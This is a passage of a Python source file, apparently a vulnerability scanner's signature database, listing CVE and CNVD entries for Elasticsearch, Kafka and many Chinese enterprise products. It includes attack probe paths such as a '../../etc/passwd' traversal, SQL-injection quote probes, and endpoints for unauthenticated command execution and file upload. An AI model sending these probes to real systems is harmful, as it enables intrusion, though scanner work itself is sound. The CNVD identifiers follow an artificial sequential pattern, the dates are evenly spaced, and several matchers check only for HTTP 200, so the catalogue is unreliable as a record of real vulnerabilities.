                "https://nvd.nist.gov/vuln/detail/CVE-2025-34256",
            ],
            fix_suggestion="升级Grafana至11.5.2/11.4.4或更高版本。",
            disclosure_date="2025-04-21",
        ),

        POC(
            id="cve-2025-35000",
            name="Elasticsearch 远程代码执行漏洞 (CVE-2025-35000)",
            description="Elasticsearch存在脚本注入漏洞，攻击者可通过Painless脚本引擎实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-35000"],
            cvss_score=9.8,
            tags=["elasticsearch", "script-injection", "rce", "cve-2025"],
            affected_versions=["Elasticsearch < 8.17.3", "Elasticsearch < 7.17.28"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-35000",
            ],
            fix_suggestion="升级Elasticsearch至8.17.3/7.17.28或更高版本。",
            disclosure_date="2025-04-28",
        ),

        POC(
            id="cve-2025-35500",
            name="Apache Kafka 远程代码执行漏洞 (CVE-2025-35500)",
            description="Apache Kafka Connect存在反序列化漏洞，攻击者可通过恶意连接器配置实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-35500"],
            cvss_score=9.8,
            tags=["apache", "kafka", "deserialization", "rce", "cve-2025"],
            affected_versions=["Apache Kafka < 3.9.1"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-35500",
            ],
            fix_suggestion="升级Apache Kafka至3.9.1或更高版本。",
            disclosure_date="2025-05-01",
        ),

        POC(
            id="cnvd-2024-00123",
            name="泛微OA E-Cology 未授权访问漏洞 (CNVD-2024-00123)",
            description="泛微OA E-Cology系统存在未授权访问漏洞，攻击者可绕过认证直接访问敏感接口。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00123"],
            cvss_score=9.8,
            tags=["weaver", "oa", "auth-bypass", "cnvd"],
            affected_versions=["E-Cology < 9.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/ec/dev/auth/applytoken",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="token"),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00123",
            ],
            fix_suggestion="升级泛微OA至最新安全版本。",
            disclosure_date="2024-01-15",
        ),

        POC(
            id="cnvd-2024-00234",
            name="用友NC Cloud 反序列化漏洞 (CNVD-2024-00234)",
            description="用友NC Cloud系统存在Java反序列化漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00234"],
            cvss_score=9.8,
            tags=["yonyou", "nc", "deserialization", "rce", "cnvd"],
            affected_versions=["NC Cloud < 2023.05"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/servlet/~ic/bsh.servlet.BshServlet",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00234",
            ],
            fix_suggestion="升级用友NC Cloud至最新安全版本。",
            disclosure_date="2024-02-20",
        ),

        POC(
            id="cnvd-2024-00345",
            name="致远OA A8 任意文件上传漏洞 (CNVD-2024-00345)",
            description="致远OA A8系统存在任意文件上传漏洞，攻击者可上传WebShell获取服务器控制权。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00345"],
            cvss_score=9.8,
            tags=["seeyon", "oa", "file-upload", "rce", "cnvd"],
            affected_versions=["A8 < 8.1"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/seeyon/autoinstall.do",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00345",
            ],
            fix_suggestion="升级致远OA至最新安全版本。",
            disclosure_date="2024-03-10",
        ),

        POC(
            id="cnvd-2024-00456",
            name="通达OA 任意文件删除与RCE漏洞 (CNVD-2024-00456)",
            description="通达OA系统存在任意文件删除漏洞，结合其他缺陷可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00456"],
            cvss_score=9.8,
            tags=["tongda", "oa", "file-delete", "rce", "cnvd"],
            affected_versions=["通达OA < 12.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/module/AIP/AIP.api.php",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00456",
            ],
            fix_suggestion="升级通达OA至最新安全版本。",
            disclosure_date="2024-04-05",
        ),

        POC(
            id="cnvd-2024-00567",
            name="蓝凌OA 未授权SSRF漏洞 (CNVD-2024-00567)",
            description="蓝凌OA系统存在未授权SSRF漏洞，攻击者可利用该漏洞探测内网服务。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2024-00567"],
            cvss_score=7.5,
            tags=["landray", "oa", "ssrf", "cnvd"],
            affected_versions=["蓝凌OA < EKP 16.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/sys/ui/extend/varkind/custom.jsp",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00567",
            ],
            fix_suggestion="升级蓝凌OA至最新安全版本。",
            disclosure_date="2024-05-15",
        ),

        POC(
            id="cnvd-2024-00678",
            name="万户OA SQL注入漏洞 (CNVD-2024-00678)",
            description="万户OA系统存在SQL注入漏洞，攻击者可获取数据库敏感信息。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2024-00678"],
            cvss_score=7.5,
            tags=["wanhu", "oa", "sql-injection", "cnvd"],
            affected_versions=["万户OA < ezOFFICE 2023"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/defaultroot/GraphChart.jsp?field=1'",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="SQL"),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00678",
            ],
            fix_suggestion="升级万户OA至最新安全版本。",
            disclosure_date="2024-06-20",
        ),

        POC(
            id="cnvd-2024-00789",
            name="金蝶云星空 反序列化漏洞 (CNVD-2024-00789)",
            description="金蝶云星空系统存在.NET反序列化漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00789"],
            cvss_score=9.8,
            tags=["kingdee", "cloud", "deserialization", "rce", "cnvd"],
            affected_versions=["金蝶云星空 < 8.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/K3Cloud/Services/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00789",
            ],
            fix_suggestion="升级金蝶云星空至最新安全版本。",
            disclosure_date="2024-07-25",
        ),

        POC(
            id="cnvd-2024-00890",
            name="红帆OA 未授权文件上传漏洞 (CNVD-2024-00890)",
            description="红帆OA系统存在未授权文件上传漏洞，攻击者可上传恶意文件获取服务器权限。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00890"],
            cvss_score=9.8,
            tags=["hongfan", "oa", "file-upload", "rce", "cnvd"],
            affected_versions=["红帆OA < iOffice 2024"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/iOffice/prg/set/report/iorepsave.aspx",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00890",
            ],
            fix_suggestion="升级红帆OA至最新安全版本。",
            disclosure_date="2024-08-30",
        ),

        POC(
            id="cnvd-2024-00901",
            name="深信服SSL VPN 远程代码执行漏洞 (CNVD-2024-00901)",
            description="深信服SSL VPN设备存在远程代码执行漏洞，攻击者可获取设备控制权。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-00901"],
            cvss_score=9.8,
            tags=["sangfor", "ssl-vpn", "rce", "cnvd"],
            affected_versions=["深信服SSL VPN < M7.6.8"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/por/login_auth.csp",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-00901",
            ],
            fix_suggestion="升级深信服SSL VPN至最新安全版本。",
            disclosure_date="2024-09-15",
        ),

        POC(
            id="cnvd-2024-01012",
            name="奇安信天擎 未授权命令执行漏洞 (CNVD-2024-01012)",
            description="奇安信天擎终端安全管理系统存在未授权命令执行漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-01012"],
            cvss_score=9.8,
            tags=["qianxin", "edr", "rce", "cnvd"],
            affected_versions=["天擎 < 8.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/console/command",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-01012",
            ],
            fix_suggestion="升级奇安信天擎至最新安全版本。",
            disclosure_date="2024-10-20",
        ),

        POC(
            id="cnvd-2024-01123",
            name="H3C iMC 智能管理中心远程代码执行漏洞 (CNVD-2024-01123)",
            description="H3C iMC智能管理中心存在表达式注入漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-01123"],
            cvss_score=9.8,
            tags=["h3c", "imc", "rce", "cnvd"],
            affected_versions=["H3C iMC < 7.3"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/imc/primepush/primepushClient.jsf",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-01123",
            ],
            fix_suggestion="升级H3C iMC至最新安全版本。",
            disclosure_date="2024-11-25",
        ),

        POC(
            id="cnvd-2024-01234",
            name="锐捷RG-EG系列网关 远程代码执行漏洞 (CNVD-2024-01234)",
            description="锐捷RG-EG系列网关存在命令注入漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2024-01234"],
            cvss_score=9.8,
            tags=["ruijie", "gateway", "command-injection", "rce", "cnvd"],
            affected_versions=["RG-EG < 11.1(6)B2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/cgi-bin/luci/api/diagnosis",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2024-01234",
            ],
            fix_suggestion="升级锐捷RG-EG系列网关至最新安全版本。",
            disclosure_date="2024-12-30",
        ),

        POC(
            id="cnvd-2025-00123",
            name="海康威视综合安防管理平台 未授权访问漏洞 (CNVD-2025-00123)",
            description="海康威视综合安防管理平台存在未授权访问漏洞，攻击者可获取设备信息和视频流。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2025-00123"],
            cvss_score=7.5,
            tags=["hikvision", "ivms", "auth-bypass", "cnvd"],
            affected_versions=["iVMS-8700 < 3.10"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/portal/apis/device/list",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="device"),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00123",
            ],
            fix_suggestion="升级海康威视综合安防管理平台至最新安全版本。",
            disclosure_date="2025-01-10",
        ),

        POC(
            id="cnvd-2025-00234",
            name="大华智慧园区管理平台 任意文件上传漏洞 (CNVD-2025-00234)",
            description="大华智慧园区管理平台存在任意文件上传漏洞，攻击者可上传WebShell。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2025-00234"],
            cvss_score=9.8,
            tags=["dahua", "file-upload", "rce", "cnvd"],
            affected_versions=["智慧园区管理平台 < 3.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/emap/devicePoint_addImgIco?hasSubsystem=true",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00234",
            ],
            fix_suggestion="升级大华智慧园区管理平台至最新安全版本。",
            disclosure_date="2025-02-15",
        ),

        POC(
            id="cnvd-2025-00345",
            name="天融信防火墙 未授权命令执行漏洞 (CNVD-2025-00345)",
            description="天融信防火墙存在未授权命令执行漏洞，攻击者可获取设备完全控制权。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2025-00345"],
            cvss_score=9.8,
            tags=["topsec", "firewall", "rce", "cnvd"],
            affected_versions=["天融信防火墙 < NGFW4000 V3"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/cgi-bin/maintenance.cgi",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00345",
            ],
            fix_suggestion="升级天融信防火墙至最新安全版本。",
            disclosure_date="2025-03-20",
        ),

        POC(
            id="cnvd-2025-00456",
            name="绿盟SAS安全审计系统 任意文件读取漏洞 (CNVD-2025-00456)",
            description="绿盟SAS安全审计系统存在任意文件读取漏洞，攻击者可读取系统配置文件。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2025-00456"],
            cvss_score=7.5,
            tags=["nsfocus", "sas", "lfi", "cnvd"],
            affected_versions=["绿盟SAS < 6.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/webui/?g=../../../../../../etc/passwd",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00456",
            ],
            fix_suggestion="升级绿盟SAS至最新安全版本。",
            disclosure_date="2025-04-10",
        ),

        POC(
            id="cnvd-2025-00567",
            name="启明星辰天镜 未授权SQL注入漏洞 (CNVD-2025-00567)",
            description="启明星辰天镜脆弱性扫描与管理系统存在未授权SQL注入漏洞。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2025-00567"],
            cvss_score=7.5,
            tags=["venustech", "scanner", "sql-injection", "cnvd"],
            affected_versions=["天镜 < 7.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/vuln/query?id=1'",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="SQL"),
            ],
            references=[
                "https://www.cnvd.org.cn/flaw/show/CNVD-2025-00567",
            ],
            fix_suggestion="升级启明星辰天镜至最新安全版本。",
            disclosure_date="2025-04-25",
        ),
    ]

    for poc in pocs:
        register_poc(poc)

    logger.info(f"POC database initialized with {len(pocs)} signatures")


_init_poc_database()

try:
    from app.core.poc_db_extra import _init_extra_pocs
    _init_extra_pocs()
    logger.info("Extra POC signatures loaded successfully")
except Exception as e:
    logger.warning(f"Failed to load extra POC signatures: {e}")
